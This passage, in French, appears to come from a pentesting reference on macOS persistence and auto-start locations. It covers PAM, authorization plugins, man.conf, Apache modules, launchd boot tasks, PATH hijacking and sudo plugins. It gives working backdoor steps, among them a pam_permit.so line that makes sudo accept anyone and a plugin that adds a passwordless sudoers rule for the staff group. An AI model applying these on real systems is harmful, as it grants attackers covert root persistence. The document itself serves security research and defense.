-rwxr-xr-x  1 root  wheel  1642 May 13 00:29 110.clean-tmps
-rwxr-xr-x  1 root  wheel   695 May 13 00:29 130.clean-msgs
[...]

/etc/periodic/monthly:
total 24
-rwxr-xr-x  1 root  wheel   888 May 13 00:29 199.rotate-fax
-rwxr-xr-x  1 root  wheel  1010 May 13 00:29 200.accounting
-rwxr-xr-x  1 root  wheel   606 May 13 00:29 999.local

/etc/periodic/weekly:
total 8
-rwxr-xr-x  1 root  wheel  620 May 13 00:29 999.local
```

D'autres scripts périodiques qui seront exécutés sont indiqués dans **`/etc/defaults/periodic.conf`** :

```bash
grep "Local scripts" /etc/defaults/periodic.conf
daily_local="/etc/daily.local"				# Local scripts
weekly_local="/etc/weekly.local"			# Local scripts
monthly_local="/etc/monthly.local"			# Local scripts
```

Sur les anciens systèmes où `periodic` et ses launch daemons étaient installés et activés, `/etc/daily.local`, `/etc/weekly.local` et `/etc/monthly.local` constituaient des chemins d’exécution supplémentaires. Une vérification inoffensive en lecture seule est :

```bash
test -x /usr/sbin/periodic && ls /System/Library/LaunchDaemons/com.apple.periodic-*.plist
```

> [!WARNING]
> La règle basée sur le propriétaire s’appliquait aux scripts directement placés dans les répertoires périodiques. L’ancien wrapper `999.local` incluait `/etc/daily.local`, `/etc/weekly.local` ou `/etc/monthly.local` sans effectuer la même vérification de propriété ; lorsque le scheduler s’exécutait en tant que root, ces fichiers locaux s’exécutaient en tant que root. Cette distinction et le changement apporté dans Big Sur 11.5 sont documentés dans la [recherche originale](https://theevilbit.github.io/beyond/beyond_0019/). Aucun de ces chemins ne doit être considéré comme actif lorsque `periodic` est absent.

### PAM

Writeup : [Linux Hacktricks PAM](../linux-hardening/software-information/pam-pluggable-authentication-modules.md)\
Writeup : [https://theevilbit.github.io/beyond/beyond_0005/](https://theevilbit.github.io/beyond/beyond_0005/)<sup>[[28]](#references)</sup>

- Utile pour contourner le sandbox : [🟠](https://emojipedia.org/large-orange-circle)
  - Mais vous devez être root
- Contournement de TCC : [🔴](https://emojipedia.org/large-red-circle)

#### Emplacement

- Root toujours requis

#### Description et exploitation

Comme PAM concerne davantage la **persistence** et les malwares que la facilité d’exécution dans macOS, ce blog ne donnera pas d’explication détaillée ; **lisez les writeups pour mieux comprendre cette technique**.<sup>[[28]](#references)</sup>

Vérifiez les modules PAM avec :

```bash
ls -l /etc/pam.d
```

Une technique de persistance/d’élévation de privilèges exploitant PAM est aussi simple que de modifier le module /etc/pam.d/sudo en ajoutant au début la ligne :

```bash
auth       sufficient     pam_permit.so
```

Donc, cela **ressemblera** à quelque chose comme ceci :

```bash
# sudo: auth account password session
auth       sufficient     pam_permit.so
auth       include        sudo_local
auth       sufficient     pam_smartcard.so
auth       required       pam_opendirectory.so
account    required       pam_permit.so
password   required       pam_deny.so
session    required       pam_permit.so
```

Et par conséquent, toute tentative d’utiliser **`sudo` fonctionnera**.

> [!CAUTION]
> Notez que ce répertoire est protégé par TCC ; il est donc très probable que l’utilisateur reçoive une demande d’autorisation d’accès.

Un autre bon exemple est `su` : on peut voir qu’il est également possible de transmettre des paramètres aux modules PAM (et vous pourriez aussi backdoorer ce fichier) :

```bash
cat /etc/pam.d/su
# su: auth account session
auth       sufficient     pam_rootok.so
auth       required       pam_opendirectory.so
account    required       pam_group.so no_warn group=admin,wheel ruser root_only fail_safe
account    required       pam_opendirectory.so no_check_shell
password   required       pam_opendirectory.so
session    required       pam_launchd.so
```

### Extensions d’autorisation

Article : [https://theevilbit.github.io/beyond/beyond_0028/](https://theevilbit.github.io/beyond/beyond_0028/)<sup>[[29]](#references)</sup>\
Article : [https://posts.specterops.io/persistent-credential-theft-with-authorization-plugins-d17b34719d65](https://posts.specterops.io/persistent-credential-theft-with-authorization-plugins-d17b34719d65)<sup>[[30]](#references)</sup>

- Utile pour contourner le sandbox : [🟠](https://emojipedia.org/large-orange-circle)
  - Mais il faut être root et ajouter des configurations
- Contournement de TCC : ???

#### Emplacement

- `/Library/Security/SecurityAgentPlugins/`
  - Droits root requis
  - Il faut également configurer la base de données d’autorisation pour utiliser le plugin

#### Description et exploitation

Vous pouvez créer un plugin d’autorisation qui sera exécuté lorsqu’un utilisateur se connecte afin de maintenir la persistence. Pour plus d’informations sur la création de ce type de plugin, consultez les articles précédents (et soyez prudent : un plugin mal écrit peut vous empêcher d’accéder à votre système, et vous devrez nettoyer votre Mac depuis le mode de récupération).<sup>[[29]](#references)[[30]](#references)</sup>

```objectivec
// Compile the code and create a real bundle
// gcc -bundle -framework Foundation main.m -o CustomAuth
// mkdir -p CustomAuth.bundle/Contents/MacOS
// mv CustomAuth CustomAuth.bundle/Contents/MacOS/

#import <Foundation/Foundation.h>

__attribute__((constructor)) static void run()
{
    NSLog(@"%@", @"[+] Custom Authorization Plugin was loaded");
    system("echo \"%staff ALL=(ALL) NOPASSWD:ALL\" >> /etc/sudoers");
}
```

**Déplacez** le bundle vers l’emplacement où il sera chargé :

```bash
cp -r CustomAuth.bundle /Library/Security/SecurityAgentPlugins/
```

Enfin, ajoutez la **règle** pour charger ce Plugin :

```bash
cat > /tmp/rule.plist <<EOF
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
            <key>class</key>
            <string>evaluate-mechanisms</string>
            <key>mechanisms</key>
            <array>
                <string>CustomAuth:login,privileged</string>
            </array>
        </dict>
</plist>
EOF

security authorizationdb write com.asdf.asdf < /tmp/rule.plist
```

Le **`evaluate-mechanisms`** indiquera au framework d’autorisation qu’il devra **appeler un mécanisme externe pour l’autorisation**. De plus, **`privileged`** fera en sorte qu’il soit exécuté par root.

Déclenchez-le avec :

```bash
security authorize com.asdf.asdf
```

Et le groupe **staff devrait avoir accès à sudo** (lisez `/etc/sudoers` pour le confirmer).

### Man.conf

Compte rendu : [https://theevilbit.github.io/beyond/beyond_0030/](https://theevilbit.github.io/beyond/beyond_0030/)<sup>[[31]](#references)</sup>

- Utile pour contourner le sandbox : [🟠](https://emojipedia.org/large-orange-circle)
  - Mais vous devez être root et l’utilisateur doit utiliser man
- Contournement de TCC : [🔴](https://emojipedia.org/large-red-circle)

#### Emplacement

- **`/private/etc/man.conf`**
  - Privilèges root requis
  - **`/private/etc/man.conf`** : chaque fois que man est utilisé

#### Description et exploitation

Le fichier de configuration **`/private/etc/man.conf`** indique le binaire/script à utiliser pour ouvrir les fichiers de documentation man. Le chemin vers l’exécutable pourrait donc être modifié afin qu’une backdoor soit exécutée chaque fois que l’utilisateur utilise man pour lire de la documentation.<sup>[[31]](#references)</sup>

Par exemple, définissez dans **`/private/etc/man.conf`** :

```
MANPAGER /tmp/view
```

Puis créez `/tmp/view` comme suit :

```bash
#!/bin/zsh

touch /tmp/manconf

/usr/bin/less -s
```

### Apache2

**Writeup**: [https://theevilbit.github.io/beyond/beyond_0025/](https://theevilbit.github.io/beyond/beyond_0025/)<sup>[[32]](#references)</sup>

- Utile pour contourner le sandbox : [🟠](https://emojipedia.org/large-orange-circle)
  - Mais vous devez être root et Apache doit être en cours d’exécution
- Contournement de TCC : [🔴](https://emojipedia.org/large-red-circle)
  - Httpd n’a pas d’entitlements

#### Emplacement

- **`/etc/apache2/httpd.conf`**
  - Root requis
  - Déclencheur : au démarrage d’Apache2

#### Description et exploit

Vous pouvez indiquer dans `/etc/apache2/httpd.conf` de charger un module en ajoutant une ligne telle que :<sup>[[32]](#references)</sup>

```bash
LoadModule my_custom_module /Users/Shared/example.dylib "My Signature Authority"
```

De cette façon, votre module compilé sera chargé par Apache. La seule condition est que vous deviez soit le **signer avec un certificat Apple valide**, soit **ajouter un nouveau certificat de confiance** au système et **le signer** avec celui-ci.

Ensuite, si nécessaire, pour vous assurer que le serveur sera démarré, vous pouvez exécuter :

```bash
sudo launchctl load -w /System/Library/LaunchDaemons/org.apache.httpd.plist
```

Exemple de code pour le Dylb :

```objectivec
#include <stdio.h>
#include <syslog.h>

__attribute__((constructor))
static void myconstructor(int argc, const char **argv)
{
     printf("[+] dylib constructor called from %s\n", argv[0]);
     syslog(LOG_ERR, "[+] dylib constructor called from %s\n", argv[0]);
}
```

### Framework d’audit BSM

Writeup : [https://theevilbit.github.io/beyond/beyond_0031/](https://theevilbit.github.io/beyond/beyond_0031/)<sup>[[33]](#references)</sup>

- Utile pour contourner sandbox : [🟠](https://emojipedia.org/large-orange-circle)
  - Mais vous devez être root, auditd doit être en cours d’exécution et déclencher un avertissement
- Contournement de TCC : [🔴](https://emojipedia.org/large-red-circle)

#### Emplacement

- **`/etc/security/audit_warn`**
  - Droits root requis
  - **Déclencheur** : quand auditd détecte un avertissement

#### Description et exploitation

Chaque fois qu’auditd détecte un avertissement, le script **`/etc/security/audit_warn`** est **exécuté**. Vous pouvez donc y ajouter votre payload.<sup>[[33]](#references)</sup>

```bash
echo "touch /tmp/auditd_warn" >> /etc/security/audit_warn
```

Vous pouvez forcer un avertissement avec `sudo audit -n`.

### Éléments de démarrage

> [!CAUTION] > **Cette fonctionnalité est obsolète : aucun élément ne devrait donc se trouver dans ces répertoires.**

Le **StartupItem** est un répertoire qui doit se trouver dans `/Library/StartupItems/` ou `/System/Library/StartupItems/`. Une fois ce répertoire créé, il doit contenir deux fichiers spécifiques :

1. Un **script rc** : un script shell exécuté au démarrage.
2. Un **fichier plist**, nommé précisément `StartupParameters.plist`, qui contient divers paramètres de configuration.

Assurez-vous que le script rc et le fichier `StartupParameters.plist` se trouvent bien dans le répertoire **StartupItem**, afin que le processus de démarrage puisse les détecter et les utiliser.

{{#tabs}}
{{#tab name="StartupParameters.plist"}}

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple Computer//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>Description</key>
        <string>This is a description of this service</string>
    <key>OrderPreference</key>
        <string>None</string> <!--Other req services to execute before this -->
    <key>Provides</key>
    <array>
        <string>superservicename</string> <!--Name of the services provided by this file -->
    </array>
</dict>
</plist>
```

{{#endtab}}

{{#tab name="superservicename"}}

```bash
#!/bin/sh
. /etc/rc.common

StartService(){
    touch /tmp/superservicestarted
}

StopService(){
    rm /tmp/superservicestarted
}

RestartService(){
    echo "Restarting"
}

RunService "$1"
```

{{#endtab}}
{{#endtabs}}

### ~~emond~~

> [!CAUTION]
> Je ne trouve pas ce composant sur mon macOS ; pour plus d’informations, consultez le writeup.

Writeup : [https://theevilbit.github.io/beyond/beyond_0023/](https://theevilbit.github.io/beyond/beyond_0023/)<sup>[[34]](#references)</sup>

Introduit par Apple, **emond** est un mécanisme de journalisation qui semble peu développé, voire peut-être abandonné, mais qui reste accessible. Bien que ce service ne soit pas particulièrement utile à un administrateur Mac, il pourrait servir de méthode de persistance discrète aux acteurs malveillants, probablement sans être remarqué par la plupart des administrateurs macOS.<sup>[[34]](#references)</sup>

Pour ceux qui savent qu’il existe, repérer toute utilisation malveillante d’**emond** est simple. Le LaunchDaemon du système pour ce service recherche des scripts à exécuter dans un répertoire unique. Pour l’inspecter, vous pouvez utiliser la commande suivante :

```bash
ls -l /private/var/db/emondClients
```

### ~~XQuartz~~

Writeup: [https://theevilbit.github.io/beyond/beyond_0018/](https://theevilbit.github.io/beyond/beyond_0018/)<sup>[[3]](#references)</sup>

#### Emplacement

- **`/opt/X11/etc/X11/xinit/privileged_startx.d`**
  - Privilèges root requis
  - **Déclencheur** : avec XQuartz

#### Description et exploit

XQuartz **n’est plus installé sur macOS** ; consultez donc le writeup pour en savoir plus.<sup>[[3]](#references)</sup>

### ~~kext~~

> [!CAUTION]
> Installer un kext est si compliqué, même en tant que root, que cette technique n’est pas considérée comme une méthode pratique d’évasion du sandbox ou de persistance, à moins de disposer d’un exploit.

#### Emplacement

Pour installer un KEXT en tant qu’élément de démarrage, il doit être **installé dans l’un des emplacements suivants** :

- `/System/Library/Extensions`
  - Fichiers KEXT intégrés au système d’exploitation OS X.
- `/Library/Extensions`
  - Fichiers KEXT installés par des logiciels tiers

Vous pouvez lister les fichiers kext actuellement chargés avec :

```bash
kextstat #List loaded kext
kextload /path/to/kext.kext #Load a new one based on path
kextload -b com.apple.driver.ExampleBundle #Load a new one based on path
kextunload /path/to/kext.kext
kextunload -b com.apple.driver.ExampleBundle
```

Pour plus d’informations sur les [**extensions du kernel, consultez cette section**](macos-security-and-privilege-escalation/mac-os-architecture/index.html#i-o-kit-drivers).

### ~~amstoold~~

Compte rendu : [https://theevilbit.github.io/beyond/beyond_0029/](https://theevilbit.github.io/beyond/beyond_0029/)<sup>[[35]](#references)</sup>

#### Emplacement

- **`/usr/local/bin/amstoold`**
  - Droits root requis

#### Description et exploitation

Apparemment, le `plist` de `/System/Library/LaunchAgents/com.apple.amstoold.plist` utilisait ce binaire tout en exposant un service XPC... Le problème, c’est que le binaire n’existait pas. On pouvait donc placer quelque chose à cet emplacement et, lorsque le service XPC était appelé, votre binaire était exécuté.<sup>[[35]](#references)</sup>

Je ne trouve plus cela dans ma version de macOS.

### ~~xsanctl~~

Compte rendu : [https://theevilbit.github.io/beyond/beyond_0015/](https://theevilbit.github.io/beyond/beyond_0015/)<sup>[[36]](#references)</sup>

#### Emplacement

- **`/Library/Preferences/Xsan/.xsanrc`**
  - Droits root requis
  - **Déclencheur** : lorsque le service est exécuté (rarement)

#### Description et exploitation

Apparemment, ce script est rarement exécuté et je ne l’ai même pas trouvé dans ma version de macOS. Pour plus d’informations, consultez le compte rendu.<sup>[[36]](#references)</sup>

### ~~/etc/rc.common~~

> [!CAUTION] > **Cela ne fonctionne pas sur les versions modernes de macOS**

Il est également possible de placer ici des **commandes qui seront exécutées au démarrage.** Exemple de script rc.common standard :

```bash
#
# Common setup for startup scripts.
#
# Copyright 1998-2002 Apple Computer, Inc.
#

######################
# Configure the shell #
######################

#
# Be strict
#
#set -e
set -u

#
# Set command search path
#
PATH=/bin:/sbin:/usr/bin:/usr/sbin:/usr/libexec:/System/Library/CoreServices; export PATH

#
# Set the terminal mode
#
#if [ -x /usr/bin/tset ] && [ -f /usr/share/misc/termcap ]; then
#    TERM=$(tset - -Q); export TERM
#fi

###################
# Useful functions #
###################

#
# Determine if the network is up by looking for any non-loopback
# internet network interfaces.
#
CheckForNetwork()
{
    local test

    if [ -z "${NETWORKUP:=}" ]; then
	test=$(ifconfig -a inet 2>/dev/null | sed -n -e '/127.0.0.1/d' -e '/0.0.0.0/d' -e '/inet/p' | wc -l)
	if [ "${test}" -gt 0 ]; then
	    NETWORKUP="-YES-"
	else
	    NETWORKUP="-NO-"
	fi
    fi
}

alias ConsoleMessage=echo

#
# Process management
#
GetPID ()
{
    local program="$1"
    local pidfile="${PIDFILE:=/var/run/${program}.pid}"
    local     pid=""

    if [ -f "${pidfile}" ]; then
	pid=$(head -1 "${pidfile}")
	if ! kill -0 "${pid}" 2> /dev/null; then
	    echo "Bad pid file $pidfile; deleting."
	    pid=""
	    rm -f "${pidfile}"
	fi
    fi

    if [ -n "${pid}" ]; then
	echo "${pid}"
	return 0
    else
	return 1
    fi
}

#
# Generic action handler
#
RunService ()
{
    case $1 in
      start  ) StartService   ;;
      stop   ) StopService    ;;
      restart) RestartService ;;
      *      ) echo "$0: unknown argument: $1";;
    esac
}
```

### Tâches de démarrage launchd

Writeup : [https://theevilbit.github.io/beyond/beyond_0034/](https://theevilbit.github.io/beyond/beyond_0034/)<sup>[[40]](#references)</sup>

- Utile pour contourner le sandbox : [🔴](https://emojipedia.org/large-red-circle) (root requis)
- Root requis, ainsi qu’un **SIP bypass** ou la permission **`kTCCServiceSystemPolicySysAdminFiles`**/Full Disk Access, selon le chemin

#### Emplacement

`launchd` intègre un plist dans sa section **`__TEXT,__config`**, qui décrit les premières « tâches de démarrage ». Plusieurs scripts/binaires de référence qui n’existent **pas** par défaut et qu’un attaquant peut créer :

- Ensemble SIP bypass : **`/Library/Apple/usr/libexec/finish_demo_restore`**, **`/private/var/install/shutdown_installer_tasks`**, **`/private/var/install/deferred_install`**
- Ensemble TCC/FDA : **`/etc/rc.server`**, **`/etc/rc.cdrom`**, **`/etc/rc.netboot`** (`rc.netboot` n’existe par défaut que sur Sequoia+)

#### Description et exploitation

Videz la table des tâches intégrée pour voir quels fichiers `launchd` exécutera et quelles clés sont prises en charge (`Program`, `ProgramArguments`, `PerformAfterUserspaceReboot`, `RequireSuccess`…) :

```bash
otool -X -s __TEXT __config /sbin/launchd | awk '{print $2 $3 $4 $5}' | \
  xxd -r -p | hexdump -v -e '1/4 "%08x"' -e '"\n"' | xxd -r -p
```

Créer l’un des fichiers référencés (par exemple `/etc/rc.server`) amène `launchd` à l’exécuter au prochain redémarrage (de l’espace utilisateur). Les entrées les plus utiles sont protégées par SIP ou nécessitent TCC SysAdminFiles/Full Disk Access ; cette technique nécessite donc les privilèges root et se déclenche au redémarrage.<sup>[[40]](#references)</sup>

### ~~NVRAM (`apple-trusted-trampoline`)~~

Writeup : [https://theevilbit.github.io/beyond/beyond_0035/](https://theevilbit.github.io/beyond/beyond_0035/)<sup>[[41]](#references)</sup>

La tâche de démarrage `rc.trampoline` exécute au démarrage un **binaire de la plateforme (signé par Apple)** stocké dans la variable NVRAM `apple-trusted-trampoline`, mais **uniquement si l’argument de démarrage `rc.trampoline=1` est défini et que SIP est désactivé** (avec une limite de taille d’environ 390&nbsp;KB et une contrainte imposant de bloquer ou de retourner rapidement). Comme cette technique nécessite **root + SIP désactivé + une charge utile signée par Apple**, elle est essentiellement impraticable pour assurer une persistance dans le monde réel et n’est mentionnée ici que par souci d’exhaustivité.<sup>[[41]](#references)</sup>

### /etc/paths et /etc/paths.d (PATH hijack)

- Utile pour contourner le sandbox : [🔴](https://emojipedia.org/large-red-circle) (nécessite root pour écrire)
- Privilèges root requis

#### Emplacement

- **`/etc/paths`** et **`/etc/paths.d/*`** — lus par **`path_helper`** (appelé depuis `/etc/zprofile`) pour construire le `PATH` par défaut à la connexion.

#### Description et exploitation

Les deux appartiennent à root. Ajouter au début un répertoire contrôlé par un attaquant (en modifiant `/etc/paths` ou en déposant un fichier dans `/etc/paths.d/`) place ce répertoire au début du `PATH` de chaque nouveau shell de connexion. Ainsi, un binaire malveillant portant le nom d’une commande courante (`ls`, `git`, …) **prend la place** du véritable et s’exécute la prochaine fois que la victime l’appelle.

```bash
# e.g. Homebrew already ships a /etc/paths.d entry; an attacker drops their own
echo "/private/tmp/evil" | sudo tee /etc/paths.d/00-evil
# -> /private/tmp/evil is prepended to PATH for new login shells
```

### storagekitd SIP Bypass (CVE-2024-44243)

Writeup: [https://www.microsoft.com/en-us/security/blog/2025/01/13/analyzing-cve-2024-44243-a-macos-system-integrity-protection-bypass-through-kernel-extensions/](https://www.microsoft.com/en-us/security/blog/2025/01/13/analyzing-cve-2024-44243-a-macos-system-integrity-protection-bypass-through-kernel-extensions/)<sup>[[46]](#references)</sup>

- Utile pour bypasser le sandbox : [🔴](https://emojipedia.org/large-red-circle) (root requis)
- Root requis ; le résultat **bypass SIP**. macOS **15.0–15.1** est affecté ; le problème est corrigé dans **15.2**.

#### Emplacement

- Déposer un bundle de système de fichiers dans **`/Library/Filesystems/`**.

#### Description et exploitation

`storagekitd` possède l’entitlement **`com.apple.rootless.install.heritable`** et lançait les binaires des bundles de système de fichiers en leur **transmettant** cette capacité de bypass de SIP. En installant un bundle de système de fichiers malveillant, un attaquant pouvait exécuter du code avec un bypass de SIP afin d’installer des **extensions de kernel persistantes** ou d’écrire dans des répertoires `LaunchDaemon` protégés par SIP — une persistence qui survit aux protections habituelles et les contourne.<sup>[[46]](#references)</sup> Apple a corrigé le problème dans macOS Sequoia 15.2.

### Plugins sudo (`/etc/sudo.conf`)

Writeup : [On Writing Sudo Plugins (sigma-star)](https://blog.sigma-star.io/2025/07/on-writing-sudo-plugins/)<sup>[[51]](#references)</sup>

- Utile pour bypasser le sandbox : [🔴](https://emojipedia.org/large-red-circle) (root requis pour écrire dans `/etc/sudo.conf`)
- Root requis pour l’installation ; le plugin s’exécute ensuite lors de **chaque invocation de `sudo`** (contexte setuid-root)

#### Emplacement

- **`/etc/sudo.conf`** — Les lignes `Plugin` chargent des objets partagés depuis **`/usr/libexec/sudo/`** (ou depuis un chemin absolu). Le fichier est absent par défaut (sudo utilise une policy intégrée) : le créer fournit donc un hook discret.

#### Description et exploitation

`sudo` charge ses plugins de policy, d’approbation et d’audit depuis `/etc/sudo.conf`. Comme `sudo` est setuid-root, un plugin d’objet partagé malveillant s’exécute avec les **privilèges root chaque fois qu’un utilisateur exécute `sudo`** — une persistence root durable qui observe également chaque commande sudo.<sup>[[51]](#references)</sup> macOS fournit sudo 1.9.x, qui prend en charge l’API de plugins.

```bash
# As root: load a malicious audit/approval plugin on every sudo
cat > /etc/sudo.conf <<'CONF'
Plugin sudoers_policy sudoers.so
Plugin ht_audit /usr/libexec/sudo/ht_audit.so
CONF
# ht_audit.so's constructor / audit_open runs as root on the next `sudo <anything>`
```

### Plug-ins DAL CoreMediaIO

Compte rendu : [https://codecolor.ist/2019/11/21/two-macos-persistence-tricks-abusing-plugins/](https://codecolor.ist/2019/11/21/two-macos-persistence-tricks-abusing-plugins/)<sup>[[53]](#references)</sup>\
Exemple minimal : [https://github.com/johnboiles/coremediaio-dal-minimal-example](https://github.com/johnboiles/coremediaio-dal-minimal-example)<sup>[[54]](#references)</sup>

- **Mécanisme ancien :** obsolète depuis macOS 12.3. macOS 14.1 et les versions ultérieures désactivent par défaut les anciens plug-ins vidéo. L’utilisateur doit rétablir la prise en charge des anciens plug-ins vidéo depuis Recovery pour que cette méthode fonctionne ; un répertoire accessible en écriture ne suffit pas. [Instructions actuelles d’Apple](https://support.apple.com/en-us/108387).
- L’accès root est requis pour écrire dans le répertoire des plug-ins. Toute exécution de code dépend d’un client compatible qui charge encore les plug-ins DAL ; cela n’a pas été testé à l’exécution sous macOS 26.

#### Emplacement

- **`/Library/CoreMediaIO/Plug-Ins/DAL/*.plugin`**
  - Accès root requis
  - **Déclencheur :** un client caméra compatible énumère les appareils **après le rétablissement de la prise en charge des anciens plug-ins**. La validation de bibliothèque du client peut bloquer un plug-in tiers.

#### Description et exploitation

Les plug-ins **DAL** (Device Abstraction Layer) de CoreMediaIO étaient chargés en cours de processus par certaines applications caméra. La [présentation d’Apple sur les extensions de caméra](https://developer.apple.com/videos/play/wwdc2022/10022/) précise que les anciens plug-ins DAL ne fonctionnaient **pas** avec FaceTime, QuickTime Player ou Photo Booth, et que de nombreux autres clients appliquent la validation de bibliothèque. Les [extensions Core Media I/O](https://developer.apple.com/documentation/coremediaio) modernes s’exécutent hors processus avec un modèle distinct d’installation et d’approbation. Cette technique historique en cours de processus n’implique pas un contournement général de Camera TCC sur les versions actuelles de macOS.<sup>[[53]](#references)[[54]](#references)</sup>

Observation en lecture seule sous macOS 26 : `/Library/CoreMediaIO/Plug-Ins/DAL` existe et appartient à root. La prise en charge des anciens plug-ins et leur chargement par un client n’ont pas été vérifiés.

### Plug-ins Directory Service

Compte rendu : [https://codecolor.ist/2019/11/21/two-macos-persistence-tricks-abusing-plugins/](https://codecolor.ist/2019/11/21/two-macos-persistence-tricks-abusing-plugins/)<sup>[[53]](#references)</sup>

- **Mécanisme ancien et conditionnel :** nécessite un accès root pour l’installation, ainsi qu’un plug-in réellement configuré et chargé. L’API de plug-ins de DirectoryService est obsolète ; vérifiez la configuration Open Directory du Mac cible avant de considérer cela comme un déclencheur au démarrage.

#### Emplacement

- **`/Library/DirectoryServices/PlugIns/*.dsplug`**
  - Accès root requis
  - **Déclencheur :** `dspluginhelperd` charge un plug-in configuré et admissible lorsque Open Directory en a besoin. Le [guide d’exécution des plug-ins d’Apple](https://developer.apple.com/library/archive/documentation/Networking/Conceptual/Open_Dir_Plugin/RuntimeEnviornment/RuntimeEnviornment.html) indique que les plug-ins non configurés pour le démarrage peuvent être chargés à la demande lorsque leur nœud est ouvert.

#### Description et exploitation

`dspluginhelperd` prend en charge les anciens bundles de plug-ins DirectoryService. Un plug-in malveillant peut constituer une voie d’exécution privilégiée si l’ancien plug-in est accepté et activé, distincte de PAM et des Authorization Plugins. La présence du répertoire ne prouve pas qu’un nouveau plug-in qui y serait écrit s’exécutera au prochain démarrage. Les manuels locaux d’Apple `dspluginhelperd(8)` et `opendirectoryd(8)` sous macOS 26.5 mentionnent toujours l’utilitaire et cette ancienne méthode.<sup>[[53]](#references)</sup>

Observation en lecture seule sous macOS 26 : `/Library/DirectoryServices/PlugIns` et `/usr/libexec/dspluginhelperd` existent. Aucun plug-in n’a été installé, configuré ou chargé pendant ce test.

## Techniques et outils de persistance

- [https://github.com/cedowens/Persistent-Swift](https://github.com/cedowens/Persistent-Swift)
- [https://github.com/D00MFist/PersistentJXA](https://github.com/D00MFist/PersistentJXA)

## References

- [1] [2025, l’année de l’Infostealer](https://www.pentestpartners.com/security-blog/2025-the-year-of-the-infostealer/)
- [2] [Au-delà des bons vieux LaunchAgents - 1 - fichiers de démarrage du shell](https://theevilbit.github.io/beyond/beyond_0001/)
- [3] [Au-delà des bons vieux LaunchAgents - 18 - X11 et XQuartz](https://theevilbit.github.io/beyond/beyond_0018/)
- [4] [Au-delà des bons vieux LaunchAgents - 21 - applications rouvertes](https://theevilbit.github.io/beyond/beyond_0021/)
- [5] [Au-delà des bons vieux LaunchAgents - 20 - préférences de Terminal](https://theevilbit.github.io/beyond/beyond_0020/)
- [6] [Au-delà des bons vieux LaunchAgents - 13 - plug-ins audio](https://theevilbit.github.io/beyond/beyond_0013/)
- [7] [Plug-ins Audio Unit (SpecterOps)](https://posts.specterops.io/audio-unit-plug-ins-896d3434a882)
- [8] [Au-delà des bons vieux LaunchAgents - 12 - plug-ins QuickLook](https://theevilbit.github.io/beyond/beyond_0012/)
- [9] [Au-delà des bons vieux LaunchAgents - 22 - LoginHook et LogoutHook](https://theevilbit.github.io/beyond/beyond_0022/)
- [10] [Au-delà des bons vieux LaunchAgents - 4 - tâches cron](https://theevilbit.github.io/beyond/beyond_0004/)
- [11] [Au-delà des bons vieux LaunchAgents - 2 - démarrage d’iTerm2](https://theevilbit.github.io/beyond/beyond_0002/)
- [12] [Au-delà des bons vieux LaunchAgents - 7 - plug-ins xbar](https://theevilbit.github.io/beyond/beyond_0007/)
- [13] [Au-delà des bons vieux LaunchAgents - 8 - Hammerspoon](https://theevilbit.github.io/beyond/beyond_0008/)
- [14] [Au-delà des bons vieux LaunchAgents - 6 - SSHRC](https://theevilbit.github.io/beyond/beyond_0006/)
- [15] [Au-delà des bons vieux LaunchAgents - 3 - éléments d’ouverture de session](https://theevilbit.github.io/beyond/beyond_0003/)
- [16] [Au-delà des bons vieux LaunchAgents - 14 - atrun](https://theevilbit.github.io/beyond/beyond_0014/)
- [17] [Au-delà des bons vieux LaunchAgents - 24 - actions de dossier](https://theevilbit.github.io/beyond/beyond_0024/)
- [18] [Actions de dossier pour la persistance sous macOS (SpecterOps)](https://posts.specterops.io/folder-actions-for-persistence-on-macos-8923f222343d)
- [19] [Au-delà des bons vieux LaunchAgents - 27 - raccourcis du Dock](https://theevilbit.github.io/beyond/beyond_0027/)
- [20] [Au-delà des bons vieux LaunchAgents - 17 - sélecteurs de couleur](https://theevilbit.github.io/beyond/beyond_0017/)
- [21] [Au-delà des bons vieux LaunchAgents - 26 - plug-ins Finder Sync](https://theevilbit.github.io/beyond/beyond_0026/)
- [22] [Analyse de la persistance de « Mac File Opener » (Objective-See)](https://objective-see.org/blog/blog_0x11.html)
- [23] [Au-delà des bons vieux LaunchAgents - 16 - économiseur d’écran](https://theevilbit.github.io/beyond/beyond_0016/)
- [24] [Préserver votre accès : les économiseurs d’écran comme méthode de persistance sous macOS (SpecterOps)](https://posts.specterops.io/saving-your-access-d562bf5bf90b)
- [25] [Au-delà des bons vieux LaunchAgents - 11 - importateurs Spotlight](https://theevilbit.github.io/beyond/beyond_0011/)
- [26] [Au-delà des bons vieux LaunchAgents - 9 - volet de préférences](https://theevilbit.github.io/beyond/beyond_0009/)
- [27] [Au-delà des bons vieux LaunchAgents - 19 - scripts périodiques](https://theevilbit.github.io/beyond/beyond_0019/)
- [28] [Au-delà des bons vieux LaunchAgents - 5 - modules d’authentification enfichables (PAM)](https://theevilbit.github.io/beyond/beyond_0005/)
- [29] [Au-delà des bons vieux LaunchAgents - 28 - Authorization Plugins](https://theevilbit.github.io/beyond/beyond_0028/)
- [30] [Vol de credentials persistant avec Authorization Plugins (SpecterOps)](https://posts.specterops.io/persistent-credential-theft-with-authorization-plugins-d17b34719d65)
- [31] [Au-delà des bons vieux LaunchAgents - 30 - le fichier de configuration man - man.conf](https://theevilbit.github.io/beyond/beyond_0030/)
- [32] [Au-delà des bons vieux LaunchAgents - 25 - modules Apache2](https://theevilbit.github.io/beyond/beyond_0025/)
- [33] [Au-delà des bons vieux LaunchAgents - 31 - framework d’audit BSM](https://theevilbit.github.io/beyond/beyond_0031/)
- [34] [Au-delà des bons vieux LaunchAgents - 23 - emond, le démon de surveillance des événements](https://theevilbit.github.io/beyond/beyond_0023/)
- [35] [Au-delà des bons vieux LaunchAgents - 29 - amstoold](https://theevilbit.github.io/beyond/beyond_0029/)
- [36] [Au-delà des bons vieux LaunchAgents - 15 - xsanctl](https://theevilbit.github.io/beyond/beyond_0015/)
- [37] [Au-delà des bons vieux LaunchAgents - 10 - fichiers de script d’application](https://theevilbit.github.io/beyond/beyond_0010/)
- [38] [Au-delà des bons vieux LaunchAgents - 32 - plug-ins de tuile du Dock](https://theevilbit.github.io/beyond/beyond_0032/)
- [39] [Au-delà des bons vieux LaunchAgents - 33 - widgets](https://theevilbit.github.io/beyond/beyond_0033/)
